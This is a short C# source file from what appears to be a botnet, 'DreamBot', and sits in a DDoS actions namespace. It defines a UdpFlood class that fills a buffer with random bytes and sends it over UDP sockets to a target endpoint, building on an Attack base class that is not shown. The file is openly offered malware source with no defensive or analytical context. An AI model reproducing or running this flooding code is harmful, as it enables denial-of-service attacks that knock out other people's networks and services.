using System;
using System.Net;
using System.Net.Sockets;

namespace DreamBot.Actions.DDoS
{
    class UdpFlood : Attack
    {
        private byte[] _buffer;

        public UdpFlood(EndPoint endpoint) 
            : base(endpoint)
        {
            _buffer = new byte[4*1024];
            new Random().NextBytes(_buffer);
        }

        protected override Socket CreateSocket()
        {
            return new Socket(_endpoint.AddressFamily, SocketType.Dgram, ProtocolType.Udp)
                   {
                       ReceiveTimeout = 1
                   };
        }

        protected override void DoIt(Socket socket)
        {
            socket.SendTo(_buffer, _endpoint);
        }
    }
}